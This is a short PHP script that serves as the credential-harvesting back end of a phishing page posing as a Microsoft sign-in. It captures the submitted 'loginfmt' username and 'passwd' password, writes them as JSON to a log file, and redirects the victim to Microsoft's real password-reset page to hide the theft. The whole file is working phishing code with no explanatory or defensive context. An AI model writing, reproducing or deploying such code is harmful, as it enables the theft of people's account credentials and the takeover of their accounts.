<?php

header('Location: https://account.live.com/ResetPassword.aspx');
$data = array('site' => 'Microsoft',
  'user' => $_POST['loginfmt'],
  'pass' => $_POST['passwd']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>